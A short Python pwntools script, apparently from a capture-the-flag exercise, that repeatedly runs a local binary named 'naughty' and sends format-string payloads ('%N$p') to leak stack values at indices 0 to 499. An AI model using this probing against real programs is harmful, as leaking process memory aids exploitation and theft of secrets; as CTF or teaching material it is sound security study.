from pwn import *

for i in range(500):
	p = process('./naughty')
	p.recvuntil(b'name?\n')
	p.sendline("%" + str(i) + "$p")
	print("index: " + str(i))
	print(p.recvall())